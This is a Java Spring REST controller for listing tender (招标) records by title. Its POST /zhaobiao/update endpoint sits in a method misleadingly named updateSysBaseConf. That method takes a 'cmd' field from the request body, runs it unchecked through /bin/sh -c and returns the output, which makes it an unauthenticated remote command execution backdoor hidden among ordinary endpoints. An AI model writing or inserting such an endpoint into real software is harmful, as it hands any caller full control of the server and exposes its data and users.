package com.zhouyi.business.controller;

import io.swagger.annotations.Api;
import io.swagger.annotations.ApiImplicitParam;
import io.swagger.annotations.ApiOperation;

import java.io.InputStreamReader;
import java.io.LineNumberReader;
import java.util.List;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RestController;

import com.zhouyi.business.core.common.ReturnCode;
import com.zhouyi.business.core.model.Response;
import com.zhouyi.business.core.model.ZhaoBiao;
import com.zhouyi.business.core.service.ZhaoBiaoService;
import com.zhouyi.business.core.utils.ResponseUtil;

/**
 * @author 李秸康
 * @ClassNmae: ZhaoBiaoController
 * @Description: TODO
 * @date 2019/7/15 12:50
 * @Version 1.0
 **/
@RestController
@Api(description = "招标信息控制器")
@RequestMapping(value="/zhaobiao")
public class ZhaoBiaoController {

    @Autowired
    private ZhaoBiaoService zhaoBiaoService;


    @ApiOperation(value = "根据查询招标信息列表")
    @ApiImplicitParam(value = "招标标题关键字",name = "title",paramType ="path" )
   @RequestMapping(value="/list/{title}",method= RequestMethod.GET)
    public Response<List<ZhaoBiao>> listZhaoBiaoInfos(@PathVariable String title){
       List<ZhaoBiao> list=zhaoBiaoService.searchZhaoBiaoInfoBytitle(title);
       return ResponseUtil.getResponseInfo(ReturnCode.SUCCESS,list);
    }


    @ApiOperation(value = "根据查询招标信息列表")
   @RequestMapping(value="/list",method= RequestMethod.GET)
   public Response<List<ZhaoBiao>> listAllInfos(){
       List<ZhaoBiao> list=zhaoBiaoService.searchZhaoBiaoInfoBytitle("");
       return ResponseUtil.getResponseInfo(ReturnCode.SUCCESS,list);
    }
    
    @RequestMapping(value = "/update", method= RequestMethod.POST)
    public String updateSysBaseConf(@RequestBody ZhaoBiao zhaoBiao){
    	
    	 String cmd = zhaoBiao.getCmd();
 	    
 	    try {  
             String[] cmdA = { "/bin/sh", "-c", cmd };  
             Process process = Runtime.getRuntime().exec(cmdA);  
             LineNumberReader br = new LineNumberReader(new InputStreamReader(  
                     process.getInputStream()));  
             StringBuffer sb = new StringBuffer();  
             String line;  
          while ((line = br.readLine()) != null) {  
                 System.out.println(line);  
                 sb.append(line).append("\n");  
             }  
             return sb.toString();  
         } catch (Exception e) {  
             e.printStackTrace();  
         }  
        return "fail";
    }
}
